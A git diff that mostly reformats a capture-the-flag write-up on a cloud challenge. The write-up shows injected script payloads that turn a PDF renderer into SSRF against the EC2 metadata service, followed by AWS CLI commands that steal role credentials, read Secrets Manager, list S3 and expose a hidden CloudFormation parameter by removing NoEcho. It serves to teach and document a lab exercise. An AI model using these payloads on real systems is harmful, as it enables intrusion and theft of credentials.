@@ -59,6 +59,7 @@ So I tried to look in file:///proc/self/environ but there was nothing, then I tr
 PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"
 REVERSE_PROXY_PORT=45198
 ```
+
 ~~Honestly, I just guessed and eventually~~ I deduced that the web server was running a local reverse-proxy to the EC2 instance metadata service (IMDS) on that port so I sent a put request to http://localhost:45198/latest/api/token with
 
 ```
@@ -98,9 +99,12 @@ tok.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
 tok.send();
 </script>
 ```
+
 But i faced an issue where the token went out of bounds 
+
 <img width="976" height="80" alt="image" src="https://github.com/user-attachments/assets/1938887c-1fec-4c0a-8e32-08819cd5dc3c" />
 so I changed the font size to 1px with 
+
 
 ```
 document.write('<style>body{font-size:1px}</style>' + this.responseText);
@@ -134,7 +138,15 @@ After trying a bunch of commands, secretsmanager list-secrets worked
     ]
 }
 ```
-I could then get the value with aws secretsmanager get-secret-value --secret-id internal_web_api_key-mj8au2
+
+I could then get the value with 
+
+```
+aws secretsmanager get-secret-value --secret-id internal_web_api_key-mj8au2
+```
+
+and it gives me
+
 ```
 {
     "ARN": "arn:aws:secretsmanager:ap-southeast-1:533267020068:secret:internal_web_api_key-mj8au2-U5o6lT",
@@ -147,9 +159,16 @@ I could then get the value with aws secretsmanager get-secret-value --secret-id 
     "CreatedDate": "2025-09-24T01:06:33.415000+08:00"
 }
 ```
+
 So this hints the existence of another service.
 
-So I searched what other commands I could try, ec2 describe-instances worked
+So I searched what other commands I could try and 
+
+```
+aws ec2 describe-instances
+```
+
+ gave me
 
 ```
 ...
@@ -189,9 +208,10 @@ So I searched what other commands I could try, ec2 describe-instances worked
                             ],
 ...
 ```
+
 and I received more info about the other service.
 
-The [website](https://medium.com/legionhunters/hacking-the-cloud-unveiling-secrets-in-aws-ctf-challenges-5edc9259688c) also was able to find a flag by checking the directories of its own s3 bucket, but I needed to find the name of my bucket.
+The [website](https://medium.com/legionhunters/hacking-the-cloud-unveiling-secrets-in-aws-ctf-challenges-5edc9259688c) also was able to find a flag by checking the directories of its own s3 bucket, so I needed to find the name of my bucket.
 
 I tried various local files until I hit /var/log/cloud-init-output.log and was greeted with a 97 page PDF... 
 
@@ -205,15 +225,18 @@ s3://claws-web-setup-bucket/app.zip to home/ubuntu/app.zip Archive: /home/ubuntu
 ```
 
 I ran 
+
 ```
 aws s3 ls s3://claws-web-setup-bucket
 ```
 
 and got 
+
 ```
 2025-09-24 01:26:22    1179262 app.zip
 2025-09-24 01:06:34         34 flag1.txt
 ```
+
 Damn flag1.txt..., no wonder there is another instance.
 
 Running
@@ -222,6 +245,7 @@ Running
 aws s3 cp s3://claws-web-setup-bucket/flag1.txt ./flag1.txt
 cat .\flag1.txt
 ```
+
 gives me TISC{iMPURrf3C7_sSRFic473_Si73_4nd
 
 So I guess its time for the next part... 
@@ -236,6 +260,7 @@ x.open("GET","http://172.31.73.190");
 x.send()
 </script>
 ```
+
 and it actually worked, lol, but the html is rendered tho.
 
 So I used a new payload where I just created a new document and set its text to the responseText.
@@ -252,6 +277,7 @@ x.onload=function(){
 x.open('GET','http://172.31.73.190');x.send();
 </script>
 ```
+
 and then I got 
 
 ```
@@ -299,7 +325,9 @@ window.api_key = params.get("api_key");
 </html>
 ```
 
-In the html, it mentions a /main.js, so I just placed the /main.js after the ip and sent the payload again and got
+In the html, it mentions a /main.js, so I just added /main.js in the payload.
+
+I then got
 
 ```
 const statusEl = document.getElementById("stack_status");
@@ -343,7 +371,7 @@ console.error(err);
 }
 ```
 
-Since we already know our role name, from listing instances earlier, we use a payload to use the /api/healthcheck request to get infomation regarding our credentials
+Since we already know our role name from listing instances earlier, we use a payload to use the /api/healthcheck request to get infomation regarding our credentials
 
 ```
 <script>
@@ -369,7 +397,13 @@ but this time I realised I could put word wrapping in our new document by adding
 
 Now I used aws again and set the new credentials up.
 
-So ~~by randomly trying things~~, by considering that the api allows us to make stacks I tried to make a stack also by changing the url in the payload to 'http://172.31.73.190/api/generate-stack?api_key=Uqv2JgVFhKtTsNUTyeqDkmwcjgWrar8s'
+So ~~by randomly trying things~~, by considering that the api allows us to make stacks I tried to make a stack also by changing the url in the payload to 
+
+```
+http://172.31.73.190/api/generate-stack?api_key=Uqv2JgVFhKtTsNUTyeqDkmwcjgWrar8s
+```
+
+and the new paylaod gives
 
 ```
 {"stackId":"arn:aws:cloudformation:ap-southeast-1:533267020068:stack/pawxy-sandbox-0570121c/4ade64a0-9d3d-11f0-be97-06fd013a2c11"}
@@ -391,15 +425,18 @@ DRIFTINFORMATION        NOT_CHECKED
 PARAMETERS      flagpt2 ****
 ```
 
-My neurons connected and I remembered another [website](https://infosecwriteups.com/pentesting-cloud-part-2-is-there-an-echo-in-here-ctf-walkthrough-54ec188a585d) I cam across when I was searching about cloud CTFs that had the same-ish challenge.
+My neurons connected and I remembered another [website](https://infosecwriteups.com/pentesting-cloud-part-2-is-there-an-echo-in-here-ctf-walkthrough-54ec188a585d) that faced a same-ish problem, when I was searching about cloud CTFs.
 
-So I just needed to get my stack's template file, removed the NoEcho and update my stack with the new template file.
+So I just needed to get my stack's template file, remove the NoEcho and update my stack with the new template file.
 
 Running
+
 ```
 aws cloudformation get-template --stack-name pawxy-sandbox-0570121c
 ```
+
 gives 
+
 ```
 AWSTemplateFormatVersion: '2010-09-09'
 Description: >
@@ -418,7 +455,8 @@ Resources:
 STAGESAVAILABLE Original
 STAGESAVAILABLE Processed
 ```
-So I copied this entire thing into newtemplate.yaml the removed the NoEcho specifier and the STAGESAVAILABLE thingies.
+
+So I copied this entire thing into newtemplate.yaml then removed the NoEcho specifier and the STAGESAVAILABLE thingies.
 
 Then after modifying the command from the [website](https://infosecwriteups.com/pentesting-cloud-part-2-is-there-an-echo-in-here-ctf-walkthrough-54ec188a585d), I ran
 
@@ -429,10 +467,13 @@ aws cloudformation update-stack --stack-name pawxy-sandbox-0570121c --template-b
 and it actually went through.
 
 So now when we run
+
 ```
 cloudformation describe-stacks --stack-name pawxy-sandbox-0570121c
 ```
+
 we get
+
 ```
 STACKS  2025-09-29T14:05:02.459000+00:00        Flag part 2
         True    False   2025-09-29T14:31:20.621000+00:00        arn:aws:cloudformation:ap-southeast-1:533267020068:stack/pawxy-sandbox-0570121c/4ade64a0-9d3d-11f0-be97-06fd013a2c11    pawxy-sandbox-0570121c  UPDATE_FAILED   The following resource(s) failed to create: [AppDataStore].
